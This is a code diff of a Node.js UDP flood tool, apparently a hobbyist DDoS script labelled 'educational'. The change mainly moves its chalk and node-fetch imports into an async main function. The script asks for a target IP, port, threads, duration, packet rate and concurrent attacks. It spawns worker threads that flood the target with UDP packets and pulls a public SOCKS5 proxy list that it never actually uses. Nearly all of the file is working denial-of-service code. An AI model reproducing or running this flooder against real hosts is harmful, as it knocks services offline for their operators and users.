@@ -1,158 +1,170 @@
 const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 const dgram = require('dgram');
 const readline = require('readline');
-const chalk = require('chalk');
 
-// Logo de texto en rojo brillante
-const logo = chalk.redBright(`
-░█████╗░██╗░░░██╗██████╗░███████╗██████╗░░█████╗░██████╗░
-██╔══██╗╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗██╔══██╗╚════██╗
-██║░░╚═╝░╚████╔╝░██████╦╝█████╗░░██████╔╝██║░░╚═╝░░███╔═╝
-██║░░██╗░░╚██╔╝░░██╔══██╗██╔══╝░░██╔══██╗██║░░██╗██╔══╝░░
-╚█████╔╝░░░██║░░░██████╦╝███████╗██║░░██║╚█████╔╝███████╗
-░╚════╝░░░░╚═╝░░░╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚══════╝
-
-==========================================================================
-
-╭╮╱╱╭┳━━━┳━━━┳╮╱╭┳━━━┳━━━┳━━━┳━━━┳━━━┳╮╭━┳━━━┳━━━━┳━━━╮
-┃╰╮╭╯┃╭━╮┃╭━╮┃┃╱┃┣╮╭╮┃╭━╮┃╭━╮┃╭━╮┃╭━╮┃┃┃╭┫╭━━┫╭╮╭╮┃╭━╮┃
-╰╮┃┃╭┫┃╱┃┃┃╱╰┫┃╱┃┃┃┃┃┃╰━╯┃╰━━┫┃╱┃┃┃╱╰┫╰╯╯┃╰━━╋╯┃┃╰┫╰━━╮
-╱┃╰╯┃┃╰━╯┃┃╱╭┫┃╱┃┃┃┃┃┃╭━━┻━━╮┃┃╱┃┃┃╱╭┫╭╮┃┃╭━━╯╱┃┃╱╰━━╮┃
-╱╰╮╭╯┃╭━╮┃╰━╯┃╰━╯┣╯╰╯┃┃╱╱┃╰━╯┃╰━╯┃╰━╯┃┃┃╰┫╰━━╮╱┃┃╱┃╰━╯┃
-╱╱╰╯╱╰╯╱╰┻━━━┻━━━┻━━━┻╯╱╱╰━━━┻━━━┻━━━┻╯╰━┻━━━╯╱╰╯╱╰━━━╯
-
-==========================================================================
-
-Owner : iTzDarkoPvP - v1.0.0
-`);
-
-// Función para obtener proxies
-const getProxys = async () => {
+// Importación dinámica de `node-fetch` y `chalk`
+const loadDependencies = async () => {
     const nodeFetch = await import('node-fetch');
-    const response = await nodeFetch.default('https://proxylist.geonode.com/api/proxy-list?limit=30&page=1&sort_by=lastChecked&sort_type=desc&protocols=socks5');
-    const data = await response.json();
-    return data.data;
+    const chalk = await import('chalk');
+    return { fetch: nodeFetch.default, chalk: chalk.default };
 };
 
-// Validación de IP
-const isValidIP = (ip) => {
-    const regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
-    return regex.test(ip);
-};
+const main = async () => {
+    const { fetch, chalk } = await loadDependencies();
 
-// Función para iniciar el ataque UDP con rotación de proxies y control de velocidad
-const iniciarAtaque = async (address, port, threads, time, pps, concurrentes) => {
-    console.log(logo);
-    console.log(chalk.greenBright('[~] - Script de DDOS para fines educativos'));
+    // Logo de texto en rojo brillante
+    const logo = chalk.redBright(`
+    ░█████╗░██╗░░░██╗██████╗░███████╗██████╗░░█████╗░██████╗░
+    ██╔══██╗╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗██╔══██╗╚════██╗
+    ██║░░╚═╝░╚████╔╝░██████╦╝█████╗░░██████╔╝██║░░╚═╝░░███╔═╝
+    ██║░░██╗░░╚██╔╝░░██╔══██╗██╔══╝░░██╔══██╗██║░░██╗██╔══╝░░
+    ╚█████╔╝░░░██║░░░██████╦╝███████╗██║░░██║╚█████╔╝███████╗
+    ░╚════╝░░░░╚═╝░░░╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚══════╝
 
-    if (!isValidIP(address)) {
-        console.log(chalk.redBright('[~] - IP inválida'));
-        return;
-    }
+    ==========================================================================
 
-    const proxies = await getProxys();
-    console.log(chalk.greenBright(`[~] [PROXY] Obtenidos ${proxies.length} proxies.`));
+    ╭╮╱╱╭┳━━━┳━━━┳╮╱╭┳━━━┳━━━┳━━━┳━━━┳━━━┳╮╭━┳━━━┳━━━━┳━━━╮
+    ┃╰╮╭╯┃╭━╮┃╭━╮┃┃╱┃┣╮╭╮┃╭━╮┃╭━╮┃╭━╮┃╭━╮┃┃┃╭┫╭━━┫╭╮╭╮┃╭━╮┃
+    ╰╮┃┃╭┫┃╱┃┃┃╱╰┫┃╱┃┃┃┃┃┃╰━╯┃╰━━┫┃╱┃┃┃╱╰┫╰╯╯┃╰━━╋╯┃┃╰┫╰━━╮
+    ╱┃╰╯┃┃╰━╯┃┃╱╭┫┃╱┃┃┃┃┃┃╭━━┻━━╮┃┃╱┃┃┃╱╭┫╭╮┃┃╭━━╯╱┃┃╱╰━━╮┃
+    ╱╰╮╭╯┃╭━╮┃╰━╯┃╰━╯┣╯╰╯┃┃╱╱┃╰━╯┃╰━╯┃╰━╯┃┃┃╰┫╰━━╮╱┃┃╱┃╰━╯┃
+    ╱╱╰╯╱╰╯╱╰┻━━━┻━━━┻━━━┻╯╱╱╰━━━┻━━━┻━━━┻╯╰━┻━━━╯╱╰╯╱╰━━━╯
 
-    for (let j = 0; j < concurrentes; j++) {
-        for (let i = 0; i < threads; i++) {
-            console.log(chalk.greenBright(`[~] - Iniciando thread #${i}...`));
+    ==========================================================================
 
-            const worker = new Worker(__filename, {
-                workerData: { address, port, time, thread: i, proxies, pps }
-            });
+    Owner : iTzDarkoPvP - v1.0.0
+    `);
 
-            worker.on('error', (err) => {
-                console.error(`Worker error: ${err.message}`);
-            });
+    // Función para obtener proxies
+    const getProxys = async () => {
+        const response = await fetch('https://proxylist.geonode.com/api/proxy-list?limit=30&page=1&sort_by=lastChecked&sort_type=desc&protocols=socks5');
+        const data = await response.json();
+        return data.data;
+    };
+
+    // Validación de IP
+    const isValidIP = (ip) => {
+        const regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
+        return regex.test(ip);
+    };
+
+    // Función para iniciar el ataque UDP con rotación de proxies y control de velocidad
+    const iniciarAtaque = async (address, port, threads, time, pps, concurrentes) => {
+        console.log(logo);
+        console.log(chalk.greenBright('[~] - Script de DDOS para fines educativos'));
+
+        if (!isValidIP(address)) {
+            console.log(chalk.redBright('[~] - IP inválida'));
+            return;
         }
-    }
 
-    console.log(chalk.greenBright("[~] - Iniciando en 3 segundos..."));
-};
+        const proxies = await getProxys();
+        console.log(chalk.greenBright(`[~] [PROXY] Obtenidos ${proxies.length} proxies.`));
 
-// Función para manejar los mensajes en los workers con rotación de proxies y control de velocidad
-const handleWorkerMessage = async ({ address, port, time, thread, proxies, pps }) => {
-    const client = dgram.createSocket('udp4');
-    let task = null;
-    let proxyIndex = 0;
+        for (let j = 0; j < concurrentes; j++) {
+            for (let i = 0; i < threads; i++) {
+                console.log(chalk.greenBright(`[~] - Iniciando thread #${i}...`));
 
-    setTimeout(() => {
-        task = setInterval(() => {
-            for (let i = 0; i < pps; i++) {
-                const proxy = proxies[proxyIndex];
-                client.send(Buffer.from('data'), port, address, (error) => {
-                    if (error) {
-                        console.log(chalk.redBright(`[~] - Error #${thread} no fue posible enviar paquete para ${address}:${port} [${error}]`));
-                        clearInterval(task);
-                        console.log(chalk.redBright(`[~] - #${thread} Parado`));
-                        return;
-                    }
+                const worker = new Worker(__filename, {
+                    workerData: { address, port, time, thread: i, proxies, pps }
                 });
-                proxyIndex = (proxyIndex + 1) % proxies.length;
+
+                worker.on('error', (err) => {
+                    console.error(`Worker error: ${err.message}`);
+                });
             }
-            console.log(chalk.greenBright(`[~] - #${thread} Enviando para ${address}:${port}...`));
-        }, 1000 / pps);
-    }, 3000);
-
-    setTimeout(() => {
-        clearInterval(task);
-        console.log(chalk.greenBright(`[~] - #${thread} Parado`));
-    }, 1000 * 60 * time);
-
-    console.log(chalk.greenBright(`[~] - #${thread} Iniciando`));
-};
-
-// Función para recibir y contar paquetes
-const iniciarReceiver = (port = 0) => {
-    const client = dgram.createSocket('udp4');
-    const ipList = [];
-    let messages = 0;
-
-    client.on('listening', () => {
-        const address = client.address();
-        console.log(chalk.greenBright(`[~] - Ouvindo na porta ${address.port}...`));
-    });
-
-    client.on('message', (msg, rinfo) => {
-        if (!ipList.includes(rinfo.address)) {
-            ipList.push(rinfo.address);
-            console.log(chalk.greenBright(`[~] - Novo IP: ${rinfo.address}`));
         }
-        messages++;
-    });
 
-    setInterval(() => {
-        if (messages > 0) {
-            console.log(chalk.greenBright(`[~] - ${messages} pacotes por segundo`));
-        }
-        messages = 0;
-    }, 1000);
+        console.log(chalk.greenBright("[~] - Iniciando en 3 segundos..."));
+    };
 
-    client.bind(port);
-};
+    // Función para manejar los mensajes en los workers con rotación de proxies y control de velocidad
+    const handleWorkerMessage = async ({ address, port, time, thread, proxies, pps }) => {
+        const client = dgram.createSocket('udp4');
+        let task = null;
+        let proxyIndex = 0;
 
-// Ejecución principal
-if (isMainThread) {
-    const rl = readline.createInterface({
-        input: process.stdin,
-        output: process.stdout
-    });
+        setTimeout(() => {
+            task = setInterval(() => {
+                for (let i = 0; i < pps; i++) {
+                    const proxy = proxies[proxyIndex];
+                    client.send(Buffer.from('data'), port, address, (error) => {
+                        if (error) {
+                            console.log(chalk.redBright(`[~] - Error #${thread} no fue posible enviar paquete para ${address}:${port} [${error}]`));
+                            clearInterval(task);
+                            console.log(chalk.redBright(`[~] - #${thread} Parado`));
+                            return;
+                        }
+                    });
+                    proxyIndex = (proxyIndex + 1) % proxies.length;
+                }
+                console.log(chalk.greenBright(`[~] - #${thread} Enviando para ${address}:${port}...`));
+            }, 1000 / pps);
+        }, 3000);
 
-    rl.question(chalk.greenBright('[~] Ingresar IP: '), (address) => {
-        rl.question(chalk.greenBright('[~] Ingresar porta: '), (port) => {
-            rl.question(chalk.greenBright('[~] Ingresar threads: '), (threads) => {
-                rl.question(chalk.greenBright('[~] Ingresar tempo (em minutos): '), (time) => {
-                    rl.question(chalk.greenBright('[~] Ingresar PPS (Pacotes por segundo): '), (pps) => {
-                        rl.question(chalk.greenBright('[~] Ingresar ataques concurrentes: '), (concurrentes) => {
-                            iniciarAtaque(address, port, threads, time, pps, concurrentes);
-                            iniciarReceiver(port);
-                            rl.close();
+        setTimeout(() => {
+            clearInterval(task);
+            console.log(chalk.greenBright(`[~] - #${thread} Parado`));
+        }, 1000 * 60 * time);
+
+        console.log(chalk.greenBright(`[~] - #${thread} Iniciando`));
+    };
+
+    // Función para recibir y contar paquetes
+    const iniciarReceiver = (port = 0) => {
+        const client = dgram.createSocket('udp4');
+        const ipList = [];
+        let messages = 0;
+
+        client.on('listening', () => {
+            const address = client.address();
+            console.log(chalk.greenBright(`[~] - Ouvindo na porta ${address.port}...`));
+        });
+
+        client.on('message', (msg, rinfo) => {
+            if (!ipList.includes(rinfo.address)) {
+                ipList.push(rinfo.address);
+                console.log(chalk.greenBright(`[~] - Novo IP: ${rinfo.address}`));
+            }
+            messages++;
+        });
+
+        setInterval(() => {
+            if (messages > 0) {
+                console.log(chalk.greenBright(`[~] - ${messages} pacotes por segundo`));
+            }
+            messages = 0;
+        }, 1000);
+
+        client.bind(port);
+    };
+
+    // Ejecución principal
+    if (isMainThread) {
+        const rl = readline.createInterface({
+            input: process.stdin,
+            output: process.stdout
+        });
+
+        rl.question(chalk.greenBright('[~] Ingresar IP: '), (address) => {
+            rl.question(chalk.greenBright('[~] Ingresar porta: '), (port) => {
+                rl.question(chalk.greenBright('[~] Ingresar threads: '), (threads) => {
+                    rl.question(chalk.greenBright('[~] Ingresar tempo (em minutos): '), (time) => {
+                        rl.question(chalk.greenBright('[~] Ingresar PPS (Pacotes por segundo): '), (pps) => {
+                            rl.question(chalk.greenBright('[~] Ingresar ataques concurrentes: '), (concurrentes) => {
+                                iniciarAtaque(address, port, threads, time, pps, concurrentes);
+                                iniciarReceiver(port);
+                                rl.close();
+                            });
                         });
                     });
                 });
             });
         });
-    });
-} else {
-    handleWorkerMessage(workerData);
-}
+    } else {
+        handleWorkerMessage(workerData);
+    }
+};
+
+// Ejecutar la función principal
+main();
